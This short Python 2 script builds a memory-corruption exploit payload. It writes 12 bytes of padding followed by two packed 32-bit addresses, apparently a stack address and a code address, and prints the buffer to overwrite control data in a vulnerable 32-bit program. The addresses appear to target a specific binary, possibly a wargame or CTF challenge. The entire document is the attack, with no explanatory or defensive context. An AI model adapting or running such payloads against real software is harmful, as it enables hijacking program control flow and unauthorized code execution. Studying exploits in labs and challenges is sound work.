import os, sys
from struct import pack

buf = '\x00'*12
buf += pack("<I", 0xbffea158) + pack("<I", 0x08048efe)

print buf

